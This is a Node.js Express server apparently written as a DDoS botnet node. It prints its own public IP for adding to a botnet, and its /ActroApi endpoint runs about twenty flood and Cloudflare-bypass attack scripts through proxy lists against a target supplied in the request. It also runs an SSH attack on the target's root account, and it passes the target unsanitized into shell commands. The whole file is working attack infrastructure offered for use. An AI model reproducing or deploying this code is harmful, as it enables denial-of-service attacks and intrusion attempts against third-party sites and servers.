const express = require('express');
const { exec } = require('child_process');
const url = require('url');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;
async function fetchData() {
const response = await fetch('https://httpbin.org/get');
const data = await response.json();
console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
return data
}

app.get('/ActroApi', (req, res) => {
  const { target, time, methods } = req.query;
  const sikat = new url.URL(target);
  const slurp = sikat.hostname
res.status(200).json({
    message: 'Attack Succsesfully Sent',
    target,
    time,
    methods
  });

if (methods === 'KILL') {
	console.log(`Attack Succsesfully Sent`)
    exec(`node ./lib/cache/StarsXKill.js ${target} ${time} 100 10`);
} else if (methods === 'STRIKE') {
	console.log(`Attack Succsesfully Sent`)
    exec(`node ./lib/cache/StarsXStrike.js GET ${target} ${time} 1 9 proxy.txt --full`);
} else if (methods === 'BYPASS') {
	console.log(`Attack Succsesfully Sent`)
    exec(`node ./lib/cache/StarsXBypass.js ${target} ${time} 100 10 proxy.txt`);
} else if (methods === 'SATURN') {
	console.log(`Attack Succsesfully Sent`)
    exec(`node ./lib/cache/BYPASS-SATURN.js ${target} ${time} 100 10 proxy.txt`);
} else if (methods === 'BIG') {
	console.log(`Attack Succsesfully Sent`)
    exec(`node ./lib/cache/TLS.js ${target} ${time} 100 10 proxy.txt`);
} else if (methods === 'TLS') {   
	console.log(`Attack Succsesfully Sent`)
    exec(`node ./lib/cache/StarsXTls.js ${target} ${time} 100 10`);
} else if (methods === 'BLANK') {     
	console.log(`Attack Succsesfully Sent`)
    exec(`node ./lib/cache/StarsXNinja.js ${target} ${time}`);
} else if (methods === 'MAGNUM') {
	console.log(`Attack Succsesfully Sent`)
    exec(`node ./lib/cache/HTTP-VIP.js ${target} ${time} 100 10 proxy.txt`);
} else if (methods === 'MIX') {        
	console.log(`Attack Succsesfully Sent`)
    exec(`node ./lib/cache/StarsXMix.js ${target} ${time} 100 10 proxy.txt`);
} else if (methods === 'STIN') {        
	console.log(`Attack Succsesfully Sent`)
    exec(`node ./lib/cache/TUR.js ${target} ${time} 12 1 proxy.txt`);
} else if (methods === 'BLAX') {
	console.log(`Attack Succsesfully Sent`)
    exec(`node ./lib/cache/blaxv2.js ${target} ${time} 100 10 proxy.txt`);
} else if (methods === 'WHITE') {        
	console.log(`Attack Succsesfully Sent`)
    exec(`node ./lib/cache/XYN.js ${target} ${time} 5 3 proxy.txt`);
} else if (methods === 'VVIP') {        
	console.log(`Attack Succsesfully Sent`)
    exec(`node ./lib/cache/TLS-TUR.js ${target} ${time} 32 4 proxy.txt`);
} else if (methods === 'CF') {        
	console.log(`Attack Succsesfully Sent`)
    exec(`node ./lib/cache/HTTPS.js ${target} ${time} 8 3 proxy.txt`);
} else if (methods === 'FLOOD') {        
	console.log(`Attack Succsesfully Sent`)
    exec(`node ./lib/cache/FLOOD.js ${target} ${time} 5 1 proxy.txt`);
} else if (methods === 'UAM') {        
	console.log(`Attack Succsesfully Sent`)
    exec(`node ./lib/cache/UAM.js ${target} ${time} 1 9 proxy.txt`);
} else if (methods === 'HTTP-RAW') {                 
	console.log(`Attack Succsesfully Sent`)
    exec(`node ./lib/cache/HTTP-RAW.js ${target} ${time} 60`);
} else if (methods === 'BROWSERS') {             
	console.log(`Attack Succsesfully Sent`)
    exec(`node ./lib/cache/StarsXBrowsers.js ${target} ${time} 10 100`);
} else if (methods === 'RAPE') {                  
	console.log(`Attack Succsesfully Sent`)
    exec(`node ./lib/cache/StarsXRape.js PermenMD ${time} 10 64 proxy.txt ${target}`)
} else if (methods === 'SSH') {                  
	console.log(`Attack Succsesfully Sent`)
    exec(`node ./lib/cache/StarsXSsh.js ${slurp} 22 root ${time}`);
} else if (methods === 'proxy') {                  
	console.log(`Attack Succsesfully Sent`)
    exec(`node ./lib/cache/scrape.js`);
} else {}
});
app.listen(port, () => {
fetchData()
});
